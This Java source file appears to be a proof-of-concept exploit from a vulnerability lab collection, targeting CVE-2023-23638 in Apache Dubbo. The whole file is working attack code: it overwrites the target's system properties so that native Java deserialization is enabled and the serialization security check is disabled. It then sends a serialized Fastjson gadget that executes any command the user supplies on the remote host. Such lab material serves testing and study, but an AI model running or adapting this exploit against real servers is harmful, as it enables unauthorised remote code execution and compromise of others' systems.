package org.vulhub.poc;

import org.apache.dubbo.config.ApplicationConfig;
import org.apache.dubbo.config.ReferenceConfig;
import org.apache.dubbo.rpc.service.GenericService;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Properties;

public class CVE202323638 {
    private static final String SERVICE = "org.vulhub.api.CalcService";

    public static void main(String[] args) throws Exception {
        String[] positional = PocUtils.positional(args);
        if (positional.length < 2 || positional.length > 3) {
            System.err.println("Usage: CVE-2023-23638 <host> <port> [command]");
            System.err.println("Example: CVE-2023-23638 127.0.0.1 20880 \"touch /tmp/success-cve-2023-23638\"");
            System.exit(1);
        }

        String host = positional[0];
        String port = positional[1];
        String command = positional.length == 3 ? positional[2] : "touch /tmp/success-cve-2023-23638";
        byte[] payload = serialize(FastjsonGadget.create(command));

        String url = "dubbo://" + host + ":" + port + "/" + SERVICE;
        invoke(url, "raw.return", makeClassMap("java.time.zone.TzdbZoneRulesProvider"));
        invoke(url, "raw.return", makeSystemPropertiesMap());
        invoke(url, "nativejava", payload);

        System.out.println("Payload sent to " + host + ":" + port);
    }

    private static void invoke(String url, String generic, Object argument) {
        ReferenceConfig<GenericService> reference = new ReferenceConfig<>();
        reference.setRetries(0);
        reference.setApplication(new ApplicationConfig("cve-2023-23638-poc"));
        reference.setInterface(SERVICE);
        reference.setUrl(url);
        reference.setGeneric(generic);
        reference.setTimeout(10000);

        GenericService service = reference.get();
        try {
            service.$invoke("echo", new String[]{"java.lang.Object"}, new Object[]{argument});
        } catch (Exception e) {
            // The crafted calls intentionally drive Dubbo through exceptional generic-conversion paths.
            System.err.println("Ignored expected " + generic + " invocation exception.");
        }
    }

    private static HashMap<String, String> makeClassMap(String className) {
        HashMap<String, String> map = new HashMap<>();
        map.put("class", className);
        return map;
    }

    private static HashMap<String, Object> makeSystemPropertiesMap() {
        Properties properties = new Properties();
        properties.putAll(System.getProperties());
        properties.setProperty("dubbo.security.serialize.generic.native-java-enable", "true");
        properties.setProperty("serialization.security.check", "false");

        HashMap<String, Object> map = new HashMap<>();
        map.put("class", "java.lang.System");
        map.put("properties", properties);
        return map;
    }

    private static byte[] serialize(Object object) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (ObjectOutputStream objectOutput = new ObjectOutputStream(out)) {
            objectOutput.writeObject(object);
        }
        return out.toByteArray();
    }

}
